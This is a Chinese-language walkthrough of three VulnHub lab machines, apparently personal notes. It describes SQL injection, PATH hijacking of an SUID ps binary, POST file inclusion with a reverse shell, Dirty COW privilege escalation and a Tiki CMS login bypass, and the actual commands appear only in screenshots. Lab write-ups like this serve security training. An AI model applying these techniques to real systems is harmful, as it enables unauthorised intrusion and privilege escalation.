#### Nullbyte（ps环境变量提权）

信息收集：

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image310.png)


没发现什么特殊端口

把主页照片保存下来strings发现有一串可疑字符

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image311.png)


base64解密失败，原来是网页路径

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image312.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image313.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image314.png)


爆破key成功

登录试试

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image315.png)


发现是sql注入

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image316.png)


爆出密码

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image317.png)


使用phpmyadmin登录看看

登录成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image318.png)


发现个base64的密码和用户

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image319.png)


解密发现可能是md5

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image320.png)


解密得到密码

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image321.png)


ssh服务登录成功查看/etc/passwd

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image322.png)


发现有其他用户也是bash有可能是要找其他的用户提权

发现可疑文件有s

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image323.png)


使用发现是ps的命令，说明是环境变量提权

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image324.png)


写入提权命令

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image325.png)


然后给顶替的/tmp/ps设置777的权限

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image326.png)


把ps命令顶替在前面

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image327.png)


环境变量提权成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image328.png)


#### Ch4inrulz（POST文件包含）

信息收集dirb扫后台，发现一个要密码登录的页面

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image329.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image330.png)


由此可以分析要找到密码和用户才能进入

发现可疑页面

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image331.png)


发现可以传file参数

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image332.png)


get方式报错

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image333.png)


post方式可行

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image334.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image335.png)


发现目录穿越

测试发现index.html.bak

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image336.png)


改后缀打开发现用户和密码

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image337.png)


使用john爆破出密码和用户

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image338.png)


网页登录后发现没什么东西翻译发现是文件上传

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image339.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image340.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image341.png)


试试ssh发现密码不能用

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image342.png)


上传木马找不到目录先用file读取这个upload.php的源码看看放哪了

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image343.png)


bash64解密发现上传的路径

生成监听文件上传

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image344.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image345.png)


再使用burp的文件包含访问，成功反弹shell

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image346.png)


尝试脏牛的40616.c

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image347.png)


再试试40839.c成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image348.png)


#### Tiki

信息收集发现开起了smb服务

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image349.png)


发现有robots.txt

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image350.png)


发现是个CMS

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image351.png)


初步估计是cms的漏洞

找到一个登录页面

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image352.png)


一直没找到方法试试smb服务看看有没有关键信息

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image353.png)


smb发现一个密码

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image354.png)


![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image355.png)


登录成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image356.png)


找了半天才发现版本号

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image357.png)


没找到也没关系可以发现这个是20207月

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image358.png)


所以百度看一下这个tiki的版本

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image359.png)


[接着就按照脚本的方法在登录处用 admin 登录然后用 Burp 抓包就可]

[burp抓包然后把密码删掉]

然后跑脚本

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image360.png)


一个一个发包最后一个包是这样的就成功了

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image361.png)


[发现真的登录成功了]

[信息收集]

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image362.png)


[发现密码]

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image363.png)


[sudo -l 发现是ALL可以轻松提权]
